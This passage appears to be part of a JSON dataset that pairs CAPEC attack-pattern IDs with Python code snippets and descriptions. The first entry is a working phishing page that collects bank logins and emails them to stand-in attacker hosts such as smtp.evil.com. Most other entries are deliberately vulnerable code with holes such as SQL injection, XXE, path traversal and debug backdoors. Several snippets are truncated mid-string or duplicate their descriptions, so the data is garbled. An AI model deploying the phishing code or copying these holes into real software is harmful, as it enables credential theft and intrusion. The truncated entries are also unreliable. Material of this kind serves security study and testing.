        "code_snippet": "from flask import Flask, redirect, request\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\napp = Flask(__name__)\n\n@app.route('/login')\ndef fake_login():\n    return '''\n    <html>\n        <div style='font-family: Arial;'>\n            <img src='https://legitimate-looking-bank.com/logo.png'>\n            <h2>Please verify your account</h2>\n            <form action='/collect' method='POST'>\n                Username: <input type='text' name='username'><br>\n                Password: <input type='password' name='password'><br>\n                <input type='submit' value='Login'>\n            </form>\n        </div>\n    </html>\n    '''\n\n@app.route('/collect', methods=['POST'])\ndef collect_credentials():\n    username = request.form['username']\n    password = request.form['password']\n    \n    # Send collected credentials to attacker\n    msg = MIMEMultipart()\n    msg['From'] = 'phishing@attacker.com'\n    msg['To'] = 'attacker@evil.com'\n    msg['Subject'] = 'Collected Credentials'\n    \n    body = f'Username: {username}\\nPassword: {password}'\n    msg.attach(MIMEText(body, 'plain'))\n    \n    server = smtplib.SMTP('smtp.evil.com', 587)\n    server.starttls()\n    server.login('phishing@attacker.com', 'evil_password')\n    server.send_message(msg)\n    server.quit()\n    \n    return redirect('https://real-bank.com')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)",
        "description": "This code implements a phishing attack by creating a fake login page that mimics a legitimate bank website. It uses UI misrepresentation (CWE-451) to fool users and collects credentials through a form. The collected credentials are secretly emailed to the attacker, implementing spyware behavior (CWE-512). After collecting the data, it redirects users to the legitimate site (CWE-601) to avoid suspicion. The code acts as a Trojan horse (CWE-507) by appearing as a legitimate login page while secretly harvesting credentials."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    xml_data = request.data.decode('utf-8')\n    \n    # Vulnerable: No XML validation against schema\n    # Vulnerable: No protection against XXE\n    tree = ET.fromstring(xml_data)\n    \n    # Vulnerable: Using raw XML data in XPath query without sanitization\n    xpath_query = f\"//user[@id='{tree.find('id').text",
        "description": "\"This code demonstrates multiple XML-related vulnerabilities including missing XML schema validation, XML external entity (XXE) processing, and XPath injection. The application accepts XML input without validation, processes it using unsafe parsing methods, and constructs XPath queries using unsanitized input. The code is vulnerable to XXE attacks, XPath injection, and potentially malicious XML payloads.\""
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "\"\"\"\ndef copy_user_data(user_input):\n    buffer = bytearray(16)  # Fixed size buffer\n    input_length = len(user_input)\n    \n    # Vulnerable: No size checking before copy\n    for i in range(input_length):  \n        buffer[i] = user_input[i]  \n    \n    return buffer\n\ndef process_data():\n    user_data = input(\"Enter data: \").encode()\n    result = copy_user_data(user_data)\n    print(\"Processed data:\", result.decode())\n\"\"\",\n    \"description\": \"This code demonstrates a classic buffer overflow vulnerability by copying user input into a fixed-size buffer without proper bounds checking. The buffer is initialized with 16 bytes, but the code attempts to copy the entire user input regardless of its size, potentially writing beyond the buffer's boundaries. This can lead to memory corruption and potential exploitation.\"",
        "description": "\"This code demonstrates a classic buffer overflow vulnerability by copying user input into a fixed-size buffer without proper bounds checking. The buffer is initialized with 16 bytes, but the code attempts to copy the entire user input regardless of its size, potentially writing beyond the buffer's boundaries. This can lead to memory corruption and potential exploitation.\""
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\nimport os\n\napp = Flask(__name__)\n\n@app.route('/view_file', methods=['GET'])\ndef view_file():\n    filename = request.args.get('file', '')\n    \n    # Vulnerable: No validation of user input containing SSI directives\n    content = f'''\n    <!--#include virtual=\"{filename",
        "description": "\"This code demonstrates a vulnerable web application that processes Server Side Include (SSI) directives without proper validation. It allows attackers to include arbitrary files and execute system commands through SSI directives. The application accepts user input for both file inclusion and command execution without sanitization, making it susceptible to SSI injection attacks.\""
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "from flask import Flask, request, session\nimport uuid\n\napp = Flask(__name__)\napp.secret_key = 'secret123'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    if authenticate(username, password):\n        session_token = str(uuid.uuid4())\n        session['token'] = session_token\n        response = app.make_response('Login successful')\n        response.set_cookie('session_id', session_token, httponly=False)\n        return response\n\n@app.route('/api/sensitive_data')\ndef get_sensitive_data():\n    if 'token' in session and session['token'] == request.cookies.get('session_id'):\n        return {'credit_card': '1234-5678-9012-3456'}\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)",
        "description": "This code demonstrates multiple security vulnerabilities related to session handling. It runs an HTTP server without SSL/TLS (not HTTPS), transmits sensitive data in cleartext, sets cookies without the Secure flag, and implements a basic session mechanism that's susceptible to sniffing and replay attacks. The session token is transmitted over an unencrypted channel, making it easy for attackers to capture and replay it. The server accepts these replayed tokens without any additional verification."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "\"\"\"\nimport tkinter as tk\nfrom threading import Thread\nimport time\n\nclass MaliciousUI:\n    def __init__(self):\n        self.root = tk.Tk()\n        self.root.attributes('-alpha', 0.0)  # Initially invisible\n        self.root.geometry('300x150+100+100')\n        \n        # Legitimate-looking button\n        self.button = tk.Button(self.root, text='Click to Continue', command=self.on_click)\n        self.button.pack(pady=20)\n        \n        # Hidden frame that overlays when triggered\n        self.hidden_frame = tk.Toplevel(self.root)\n        self.hidden_frame.withdraw()\n        self.hidden_frame.geometry('300x150+100+100')\n        self.malicious_button = tk.Button(self.hidden_frame, text='Download Update', \n                                        command=self.execute_malicious)\n        self.malicious_button.pack(pady=20)\n\n    def on_click(self):\n        Thread(target=self.switch_windows).start()\n\n    def switch_windows(self):\n        time.sleep(0.1)  # Race condition window\n        self.root.attributes('-alpha', 1.0)\n        self.hidden_frame.deiconify()\n        self.hidden_frame.lift()\n        self.root.after(100, self.hide_legitimate)\n\n    def hide_legitimate(self):\n        self.root.withdraw()\n\n    def execute_malicious(self):\n        # Malicious action when user unknowingly clicks\n        with open('system_access.log', 'a') as f:\n            f.write('Unauthorized access granted\\\\n')\n\n    def run(self):\n        self.root.mainloop()\n\"\"\",\n    \"description\": \"Creates a deceptive UI that tricks users by displaying a legitimate-looking window but switches to a malicious overlay when interacted with. Exploits race conditions in window switching and user input misinterpretation to execute unwanted actions.\"",
        "description": "\"Creates a deceptive UI that tricks users by displaying a legitimate-looking window but switches to a malicious overlay when interacted with. Exploits race conditions in window switching and user input misinterpretation to execute unwanted actions.\""
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "from flask import Flask, request, render_template_string\nimport os\n\napp = Flask(__name__)\n\n@app.route('/display')\ndef display_content():\n    # Unsafely loads and executes content from user input\n    user_content = request.args.get('content', '')\n    \n    # No input validation or sanitization\n    template = f'''\n    <html>\n    <body>\n        <script>\n        // Elevated privileges due to unsafe content loading\n        document.domain = '{user_content}';\n        // Bypassing same-origin policy\n        parent.document.body.innerHTML = '<div>Compromised!</div>';\n        </script>\n        {user_content}\n    </body>\n    </html>\n    '''\n    \n    # Directly renders user-controlled content without proper escaping\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates a vulnerable web application that allows zone-based security bypass through improper content rendering. It contains multiple security issues: executing with unnecessary privileges by allowing direct template rendering, lack of input validation, missing output encoding, and improper authorization checks. The application blindly accepts and renders user input in a template string, enabling cross-zone scripting attacks that can bypass browser security controls."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "from flask import Flask, make_response\n\ndef create_app():\n    app = Flask(__name__)\n\n    @app.route('/profile')\n    def profile():\n        # Vulnerable: User input directly injected into response header\n        user_data = request.args.get('data', '')\n        \n        # Creates response with unsafe header\n        response = make_response('Profile page')\n        response.headers['X-User-Data'] = user_data\n        \n        return response\n\n    return app\n\napp = create_app()\napp.run(host='0.0.0.0', port=8080)",
        "description": "This code is vulnerable to HTTP Request/Response splitting by allowing unvalidated user input in response headers. An attacker can inject CR/LF sequences (\\r\\n) to split the response and inject additional malicious headers or content, potentially leading to cache poisoning or response injection attacks. The code fails to sanitize special characters in the header value, allowing manipulation of HTTP message boundaries."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "def log_user_activity(user_input, log_file='server.log'):\n    with open(log_file, 'a') as f:\n        f.write(f'User activity: {user_input}\\n')\n\ndef display_log_viewer(request):\n    user_name = request.GET.get('user', '')\n    log_filter = f'<div>Showing logs for: {user_name}</div>'\n    \n    with open('server.log', 'r') as f:\n        logs = f.readlines()\n    \n    html_output = f'''\n    <html>\n        <body>\n            {log_filter}\n            <img src=\"logger.jpg\" onclick=\"{user_name}\"/>\n            <div>\n                {''.join(logs)}\n            </div>\n        </body>\n    </html>\n    '''\n    return html_output",
        "description": "This vulnerable code demonstrates both log injection and XSS vulnerabilities. It accepts unsanitized user input and writes it directly to log files, then displays those logs in an HTML context without proper escaping. The code also includes an IMG tag with unfiltered user input in an event handler, allowing for potential script injection. The combination allows attackers to inject malicious content into logs which can then be executed when viewing the logs through the web interface."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    \n    # Vulnerable cookie handling\n    response = make_response('Login successful')\n    response.headers['Access-Control-Allow-Methods'] = 'TRACE, GET, POST'\n    response.set_cookie('session_id', 'user_123', secure=False, httponly=False)\n    response.set_cookie('auth_token', password, secure=False, httponly=False)\n    \n    return response\n\n@app.route('/profile')\ndef profile():\n    # No CSRF protection\n    session_id = request.cookies.get('session_id')\n    auth_token = request.cookies.get('auth_token')\n    \n    # XSS vulnerable output\n    user_input = request.args.get('name', '')\n    return f'<h1>Welcome, {user_input}</h1>'",
        "description": "This code is vulnerable to Cross Site Tracing (XST) by explicitly allowing TRACE method, setting cookies without secure and httponly flags, and exposing sensitive information in cookies. It also contains related vulnerabilities like CSRF (no tokens/verification) and XSS (unescaped user input). The combination allows credential theft through header manipulation and cookie exposure."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "\"\"\"\nimport sqlite3\nimport os\n\ndef store_user_data(username, data):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    cursor.execute(f\\\"\\\"\\\"\n        INSERT INTO user_data (username, command_data) \n        VALUES ('{username",
        "description": "\"This vulnerable code demonstrates a second-order SQL injection leading to command injection. It stores user input directly into a database without sanitization using string formatting in SQL queries. Later, it retrieves and executes these stored commands using os.system() without validation, allowing for both SQL injection during storage and command injection during execution.\""
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\nfrom models import User\n\nengine = create_engine('sqlite:///users.db')\nSession = sessionmaker(bind=engine)\nsession = Session()\n\ndef search_users(user_input):\n    # Vulnerable: raw SQL query with unvalidated input\n    raw_query = f\"SELECT * FROM users WHERE username LIKE '%{user_input}%'\"\n    result = session.execute(raw_query)\n    return result.fetchall()\n\ndef authenticate_user(username, password):\n    # Vulnerable: string formatting in ORM query\n    query = f\"from User where username='{username}' and password='{password}'\"\n    user = session.query(eval(query)).first()\n    return user",
        "description": "This code demonstrates vulnerable usage of SQLAlchemy ORM by bypassing its safe query methods and using raw SQL queries with string formatting. It contains two vulnerable functions: one using direct SQL execution with unvalidated input, and another misusing the ORM by constructing queries through string formatting and eval(). Both methods are susceptible to SQL injection attacks despite using an ORM framework."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "\"\"\"\nfrom spyne import Application, rpc, ServiceBase, String\nfrom spyne.protocol.soap import Soap11\nfrom spyne.server.wsgi import WsgiApplication\nimport mysql.connector\n\nclass UserService(ServiceBase):\n    @rpc(String, String, _returns=String)\n    def get_user_details(ctx, username, password):\n        conn = mysql.connector.connect(\n            host='localhost',\n            user='root',\n            password='password123',\n            database='users'\n        )\n        cursor = conn.cursor()\n        \n        # Vulnerable SQL query construction from SOAP parameters\n        query = f\"SELECT * FROM users WHERE username='{username",
        "description": "\"A vulnerable SOAP web service implementation that processes user authentication without proper input validation or parameterized queries. The service accepts username and password via SOAP message and directly interpolates them into a SQL query string, making it susceptible to SQL injection through malicious SOAP message parameters.\""
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "\"\"\"\nfrom flask import Flask, jsonp, request, Response\nimport json\n\napp = Flask(__name__)\n\n@app.route('/api/user_data')\ndef get_user_data():\n    # Vulnerable: No origin validation or CSRF protection\n    callback = request.args.get('callback', '')\n    \n    sensitive_data = {\n        'username': 'admin',\n        'email': 'admin@example.com',\n        'api_key': 'secret_key_123',\n        'account_balance': 10000",
        "description": "\"This code implements a vulnerable JSONP endpoint that exposes sensitive user data. It fails to implement proper origin validation, CSRF protection, and allows any website to include and execute the response in their context through JSONP callback. The code demonstrates multiple vulnerabilities including insufficient data authenticity verification (CWE-345), origin validation error (CWE-346), CSRF (CWE-352), and client-side enforcement of server-side security (CWE-602).\""
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import random\n\ndef authenticate_user(username, password):\n    # Weak password storage - using simple dictionary\n    users = {\n        'admin': '123456',\n        'user1': 'password123'\n    }\n    \n    # Simple token generation with predictable random\n    def generate_token():\n        random.seed(1234)  # Fixed seed\n        return str(random.randint(1000, 9999))\n    \n    # No lockout mechanism for failed attempts\n    if username in users:\n        if password == users[username]:\n            return {'status': 'success', 'token': generate_token()}\n    return {'status': 'failed'}\n\n# Example usage\ndef brute_force_login():\n    common_passwords = ['123456', 'password', 'admin', 'password123']\n    for password in common_passwords:\n        result = authenticate_user('admin', password)\n        if result['status'] == 'success':\n            return result",
        "description": "This vulnerable code demonstrates multiple security weaknesses including weak password storage, predictable token generation, lack of rate limiting for authentication attempts, and susceptibility to brute force attacks. It uses a fixed seed for random number generation, stores passwords in plaintext, and has no mechanism to prevent repeated login attempts."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "\"\"\"\nimport ctypes\nimport platform\n\nclass DeviceControl:\n    def __init__(self):\n        self.device_handle = None\n        self.debug_mode = False\n        self.registers = {\n            'CONTROL': 0x0,\n            'STATUS': 0x4,\n            'DEBUG': 0x8,\n            'TEST': 0xC",
        "description": "\"This code demonstrates vulnerable hardware interface control through IOCTLs and register access. It lacks proper access control for register operations, allows unrestricted debug mode activation, and contains unprotected test sequences that can modify critical hardware state. The implementation doesn't verify component identifiers and exposes direct register manipulation without proper security checks.\""
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.users = {'admin': 'password123'}\n        self.login_attempts = {}\n        self.debug_mode = True\n\n    def authenticate(self, username, password):\n        # Insecure: No rate limiting on login attempts\n        if username not in self.login_attempts:\n            self.login_attempts[username] = 0\n\n        # Debug backdoor - allows access if debug_mode is enabled\n        if self.debug_mode and password.endswith('_debug'):\n            return True\n\n        # Weak password validation\n        if username in self.users:\n            # Simple string comparison without secure hashing\n            return self.users[username] == password\n\n        return False\n\n    def reset_password(self, username, old_password, new_password):\n        # Insecure: No proper validation of current session\n        if username in self.users:\n            self.users[username] = new_password\n            return True\n        return False",
        "description": "This code demonstrates multiple authentication vulnerabilities including lack of brute force protection, weak password storage, debug backdoors, and insufficient session validation. It implements a basic authentication system that fails to properly secure access, allowing potential bypass through debug mode, unlimited login attempts, and improper password management."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.is_admin = False\n        self.auth_token = None\n    \n    def login(self, username, password):\n        # Vulnerable: Authentication state stored in client-controllable variable\n        if username == 'admin' and password == 'admin123':\n            self.is_admin = True\n            self.auth_token = 'static_token_123'\n            return True\n        return False\n    \n    def check_auth(self):\n        # Vulnerable: No validation of auth_token, assumes immutable state\n        return self.is_admin\n    \n    def get_sensitive_data(self):\n        # Vulnerable: Relies on easily modifiable boolean flag\n        if self.is_admin:\n            return 'SECRET_DATA'\n        return 'Access Denied'\n\n# Attacker can bypass by directly setting:\n# auth_system = AuthenticationSystem()\n# auth_system.is_admin = True  # Bypass authentication\n# print(auth_system.get_sensitive_data())  # Access granted",
        "description": "This code demonstrates multiple authentication bypass vulnerabilities. It uses a simple boolean flag to track authentication state which can be easily modified, stores an immutable authentication token, and lacks proper session validation. An attacker can bypass authentication by directly manipulating the is_admin flag or auth_token without proper authentication."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import os\nimport logging\nimport socket\n\ndef probe_system_info():\n    sensitive_data = {\n        'system': os.uname(),\n        'env_vars': dict(os.environ),\n        'home_dir': os.path.expanduser('~'),\n        'network': socket.gethostbyname_ex(socket.gethostname())\n    }\n    \n    # Debug mode enabled by default\n    DEBUG = True\n    \n    if DEBUG:\n        # Log sensitive information to a world-readable file\n        logging.basicConfig(filename='system_debug.log', level=logging.DEBUG)\n        logging.debug(f'System Information: {sensitive_data}')\n        \n        # Create a search path using user input\n        user_path = input('Enter search path: ')\n        os.environ['PATH'] += f':{user_path}'\n        \n        # Create temporary files with collected data\n        with open('/tmp/system_info.txt', 'w') as f:\n            f.write(str(sensitive_data))\n    \n    return sensitive_data",
        "description": "This vulnerable code actively probes system information and exposes sensitive data through multiple vectors: debug logging to world-readable files, accepting untrusted search paths, and storing sensitive information in unprotected temporary files. It demonstrates information exposure (CWE-200), debug-time information exposure (CWE-1243), and creation of emergent resources (CWE-1229) through the temporary files. The code also allows for path manipulation (CWE-426) through user input."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\nimport sys\n\ndef send_sensitive_data():\n    # Create a socket for communication\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 12345)\n    \n    try:\n        sock.connect(server_address)\n        \n        # Sensitive data transmitted in cleartext\n        username = 'admin'\n        password = 'secret123'\n        credit_card = '4111-1111-1111-1111'\n        \n        # Send data without encryption or integrity checks\n        message = f'username={username}&password={password}&cc={credit_card}'\n        sock.sendall(message.encode('utf-8'))\n        \n        # Receive response without verification\n        data = sock.recv(1024)\n        \n    finally:\n        sock.close()\n\nsend_sensitive_data()",
        "description": "This code demonstrates vulnerable data transmission by sending sensitive information (username, password, credit card) in cleartext over a network socket without encryption or message integrity checks. The code is susceptible to network sniffing attacks as it transmits sensitive data unprotected, violating CWE-319. It also lacks message integrity verification (CWE-924) and proper network traffic control (CWE-406), making it vulnerable to tampering and network-based attacks."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "\"\"\"\ndef process_user_input(user_input):\n    # Flawed validation that only checks for single encoding\n    def basic_validation(input_str):\n        banned_chars = ['.', '/', '\\\\', '%2E', '%2F']\n        return not any(char in input_str for char in banned_chars)\n    \n    # Validate before decoding - vulnerable to double encoding\n    if basic_validation(user_input):\n        try:\n            # First URL decode\n            first_decode = urllib.parse.unquote(user_input)\n            # Second URL decode\n            final_decode = urllib.parse.unquote(first_decode)\n            \n            # Process the input without proper validation after decoding\n            file_path = f'/var/www/{final_decode",
        "description": "\"This code demonstrates vulnerability to double encoding attacks by validating input before decoding and using an incomplete denylist. An attacker could bypass security by double encoding malicious characters (e.g., using %252E for '.'). The validation occurs before decoding, allowing encoded malicious payloads to pass through. The code also uses the decoded input directly in a file path, enabling path traversal attacks.\""
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "\"\"\"\nclass ProductionSystem:\n    def __init__(self):\n        self.DEBUG_MODE = True\n        self.debug_token = 'default_debug_token'\n        self._reserved_bits = 0xFF\n        self.security_tokens = {'admin': 'admin123', 'debug': 'debug123'",
        "description": "\"This code demonstrates a vulnerable production system with active debug code, exposed debug interfaces, and insecure security token handling. It includes unprotected debug mode flags, exposed system information in debug messages, and a backdoor through debug functionality. The system also uses insecure token verification and exposes reserved bits that could be exploited.\""
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class FileSystem:\n    def __init__(self):\n        self.files = {\n            'public_docs': 'Public content',\n            'financial_data': 'Sensitive financial records',\n            'user_passwords': 'Encrypted passwords'\n        }\n\n    def read_file(self, filename, user):\n        # Missing proper privilege checks\n        return self.files[filename]\n\n    def modify_file(self, filename, new_content, user):\n        # No verification of user permissions\n        self.files[filename] = new_content\n\n# Usage\nfs = FileSystem()\nregular_user = {'name': 'bob', 'role': 'user'}\n\n# Regular user can access sensitive files\nsensitive_data = fs.read_file('user_passwords', regular_user)\nfs.modify_file('financial_data', 'Modified by unauthorized user', regular_user)",
        "description": "This code demonstrates a vulnerable file system implementation where proper privilege management is missing. The system fails to check user permissions before allowing access to sensitive files, allowing any user to read and modify critical resources regardless of their privilege level. This violates the principle of proper access control and privilege management."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def read_user_data(user_id, offset):\n    # Buffer containing sensitive user data\n    user_buffer = bytearray(b'user123:password456:admin=false')\n    \n    # No validation of offset - allows reading outside buffer bounds\n    try:\n        # Vulnerable: allows reading 16 bytes starting from any offset\n        data = user_buffer[offset:offset+16]\n        return data.decode('utf-8')\n    except:\n        return None\n\n# Example usage that could lead to buffer over-read\nresult = read_user_data(1, 50)",
        "description": "This code demonstrates a vulnerable buffer access implementation where an unchecked offset parameter allows reading beyond the buffer's bounds. The function attempts to read user data from a fixed buffer but fails to validate the offset parameter, potentially allowing access to memory outside the intended buffer boundaries through buffer over-read (CWE-126) and improper index validation (CWE-1285)."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "\"\"\"\nimport threading\nimport time\n\nshared_resource = 0\nlock = threading.Lock()  # Intentionally not used to demonstrate vulnerability\n\nclass UnsafeThread(threading.Thread):\n    def __init__(self, thread_id, name):\n        threading.Thread.__init__(self)\n        self.thread_id = thread_id\n        self.name = name\n    \n    def run(self):\n        global shared_resource\n        for _ in range(5):\n            # Vulnerable: No synchronization when accessing shared resource\n            temp = shared_resource\n            time.sleep(0.1)  # Simulate some processing\n            temp += 1\n            shared_resource = temp  # Race condition here\n\n# Create threads that unsafely access shared resource\nthread1 = UnsafeThread(1, \"Thread-1\")\nthread2 = UnsafeThread(2, \"Thread-2\")\n\nthread1.start()\nthread2.start()\n\nthread1.join()\nthread2.join()\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable implementation of resource sharing between multiple threads. The shared_resource variable is accessed without proper synchronization mechanisms, leading to race conditions and potential data corruption. The code intentionally omits using the lock object to protect the shared resource, making it vulnerable to concurrent access issues. This represents CWE-662 (Improper Synchronization) and exemplifies how shared resources can be compromised when proper isolation and synchronization mechanisms are not implemented.\"",
        "description": "\"This code demonstrates a vulnerable implementation of resource sharing between multiple threads. The shared_resource variable is accessed without proper synchronization mechanisms, leading to race conditions and potential data corruption. The code intentionally omits using the lock object to protect the shared resource, making it vulnerable to concurrent access issues. This represents CWE-662 (Improper Synchronization) and exemplifies how shared resources can be compromised when proper isolation and synchronization mechanisms are not implemented.\""
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import socket\nimport threading\n\ndef handle_client(conn):\n    while True:\n        # No limit on data size or connection time\n        data = conn.recv(65536)\n        if not data:\n            break\n        # Keep connection open and store data in memory without limits\n        stored_data.append(data)\n        conn.send(b'ACK')\n    # Resource leak: connection never properly closed\n\ndef server():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('0.0.0.0', 12345))\n    sock.listen(5)\n    \n    stored_data = []\n    while True:\n        conn, addr = sock.accept()\n        # No limit on number of threads/connections\n        thread = threading.Thread(target=handle_client, args=(conn,))\n        thread.start()",
        "description": "This code demonstrates multiple resource management vulnerabilities: it creates unlimited threads for each connection without any rate limiting, accumulates data in memory without bounds, leaves connections open indefinitely, and lacks proper resource cleanup. This makes it susceptible to resource exhaustion attacks through flooding connections or sending large amounts of data."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "def read_user_file(filename):\n    base_dir = '/var/www/user_files/'\n    file_path = base_dir + filename\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except:\n        return 'Error reading file'\n\ndef handle_request(user_input):\n    contents = read_user_file(user_input)\n    return contents",
        "description": "This code is vulnerable to path traversal attacks as it directly concatenates user input to a base directory without sanitizing or validating the input. An attacker can use '../' sequences (e.g., '../../../etc/passwd') to traverse outside the intended directory and access sensitive files on the system."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "from http.server import SimpleHTTPRequestHandler, HTTPServer\n\nclass VulnerableHandler(SimpleHTTPRequestHandler):\n    def do_GET(self):\n        requested_path = self.path\n        if requested_path.endswith('/'):\n            self.list_directory(requested_path)\n        else:\n            super().do_GET()\n\nserver = HTTPServer(('0.0.0.0', 8080), VulnerableHandler)\nserver.serve_forever()",
        "description": "This code creates a vulnerable web server that allows directory listing by default, without any authentication or access controls. When a request ends with a '/', it automatically lists all files and directories in that path, potentially exposing sensitive information like configuration files, hidden files, and backup files."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "\"\"\"def process_user_points(current_points, bonus_points):\n    max_points = 2147483647  # Max value for 32-bit signed integer\n    \n    # Vulnerable: No minimum check and potential integer overflow\n    if bonus_points <= max_points:\n        total_points = current_points + bonus_points  # Can overflow\n        \n        # Points used to calculate user rewards\n        if total_points > 0:\n            reward_multiplier = total_points // 1000\n            user_reward = calculate_reward(reward_multiplier)\n            return user_reward\n    return 0\n\ndef calculate_reward(multiplier):\n    base_reward = 100\n    return base_reward * multiplier\"\"\",\n    \n    \"description\": \"This vulnerable code demonstrates integer overflow through point calculation. It lacks proper bounds checking and can result in negative points due to integer overflow when adding large positive numbers. The code only checks against a maximum value but not a minimum, and assumes the sum will always be positive. An attacker could provide values that cause the total_points to wrap around to a negative number, potentially manipulating the reward system.\"",
        "description": "\"This vulnerable code demonstrates integer overflow through point calculation. It lacks proper bounds checking and can result in negative points due to integer overflow when adding large positive numbers. The code only checks against a maximum value but not a minimum, and assumes the sum will always be positive. An attacker could provide values that cause the total_points to wrap around to a negative number, potentially manipulating the reward system.\""
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "\"\"\"\ndef process_data(user_input):\n    buffer = bytearray(10)\n    offset = int(user_input)\n    ptr = buffer\n    \n    # Vulnerable pointer manipulation\n    ptr = ptr + offset  # No bounds checking\n    \n    # Attempt to write data at calculated position\n    try:\n        ptr[0] = 0x41  # Potential out-of-bounds write\n        return ptr.tobytes()\n    except:\n        return None\n        \ndef main():\n    data = process_data(\"1000\")  # Large offset causes buffer overflow\n    if data:\n        print(data)\n    \"\"\",\n    \"description\": \"This code contains multiple pointer-related vulnerabilities. It performs unchecked pointer arithmetic based on user input, potentially leading to out-of-bounds memory access. The code fails to validate the offset value, allowing for arbitrary memory manipulation. The pointer arithmetic can result in accessing memory locations outside the intended buffer, potentially causing a buffer overflow or accessing sensitive data in memory.\"",
        "description": "\"This code contains multiple pointer-related vulnerabilities. It performs unchecked pointer arithmetic based on user input, potentially leading to out-of-bounds memory access. The code fails to validate the offset value, allowing for arbitrary memory manipulation. The pointer arithmetic can result in accessing memory locations outside the intended buffer, potentially causing a buffer overflow or accessing sensitive data in memory.\""
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.resources = {}\n\n    def allocate_resource(self, resource_id, size):\n        # No limit checking on allocation size\n        memory = [0] * size  # Allocates memory based on user input\n        self.resources[resource_id] = memory\n\n    def process_request(self, data):\n        # Vulnerable recursive function without depth limit\n        def recursive_process(data):\n            if isinstance(data, dict):\n                temp_storage = []\n                for key, value in data.items():\n                    # Creates new allocation for each recursive call\n                    result = recursive_process(value)\n                    temp_storage.append(result)\n                return temp_storage\n            return data\n\n        # No cleanup of temporary allocations\n        return recursive_process(data)\n\nmanager = ResourceManager()\n# Can be exploited with deeply nested dictionaries\nmalicious_input = {}\ncurrent = malicious_input\nfor i in range(10000):\n    current[str(i)] = {}\n    current = current[str(i)]\n\nmanager.process_request(malicious_input)",
        "description": "This code demonstrates multiple resource-related vulnerabilities: unlimited memory allocation based on user input, recursive processing without depth limits, and lack of resource cleanup. An attacker can exploit this by providing large allocation sizes or deeply nested data structures, causing excessive memory consumption and potential denial of service."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "def process_file_leak():\n    file_list = []\n    while True:\n        try:\n            f = open('large_file.txt', 'r')\n            file_list.append(f)\n            data = f.read()  # Process data\n            # Missing f.close() - resource leak\n            \n            if len(file_list) > 1000:\n                print('Processing batch...')\n                # Continue without closing files\n        except Exception as e:\n            # Even on error, files remain open\n            continue",
        "description": "This code creates a resource leak by repeatedly opening files without closing them. Each iteration adds an open file handle to a list, but never releases the resources. Over time, this will consume system file handles until no more files can be opened, potentially causing denial of service."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
